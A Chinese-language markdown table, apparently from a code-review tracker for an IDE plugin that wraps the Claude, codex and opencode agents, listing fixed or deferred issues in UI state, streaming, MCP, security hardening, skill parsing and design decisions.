| UI-02 | ✅ | `ModelEditDialog.handleSubmit` 编辑时从 `editingOriginalKey` 提取原 id 保持稳定,避免 toKey 变更触发"删旧+增新"导致 selectedModel 静默回退 |
| UI-03 | ✅ | `ModelRegistrySection` 失败时调用 `requestModelRegistry()` 回滚乐观值,确保 SettingsPanel 和 ChatScreen 显示一致数据 |
| STREAM-低危 | ✅ | 已在早期批次修复:`onError` 跳过 `notifyStreamCompleted`、`getAsInt()` isJsonNull 守卫、`handleBlockReset` isStreaming 守卫、onError 冗余通知、tail-match 安全偏移、stdin 写失败传播、InterruptedException 中断标志恢复、tabId fallback 死代码清理 |
| MCP-低危 | ✅ | 已在早期批次修复:state-file 原子写、revision-store 深拷贝返回、HTTP 请求体大小上限、FramedReader 消息大小上限、Unix 进程递归终止 |
| SEC-低危 | ✅ | `checkPathSafetyForAutoEdit`/`isAcceptEditsAllowed` 为死代码(acceptEdits 走 YIELD_TO_SDK),PermissionManager.createRequest 未调用;`SHELL_METACHARACTER_REGEX` 已加 `%`/`^`;OpenCode tool_result 补 `truncateToolResult` 20000 字符上限 |
| SKILL-低危 | ✅ | CRLF 空行检测补 `\r\n\r\n`;`FILE_LOCKS` 改 `ConcurrentHashMap` 防内存泄漏;YAML code-point limit 统一 65536(`FRONTMATTER_CODE_POINT_LIMIT` 改 public) |
| UI-低危 | ⏸️ 设计决策 | 三模型 id 初始值不对称为有意设计(Claude 有 role 常量,codex/opencode 由 registry 下发);permissionMode 不对称为功能差异(opencode 无独立模式);`SET_PROVIDER`/`SET_SESSION_PROVIDER` 语义重叠已记录为历史债务,统一收口需大重构 |
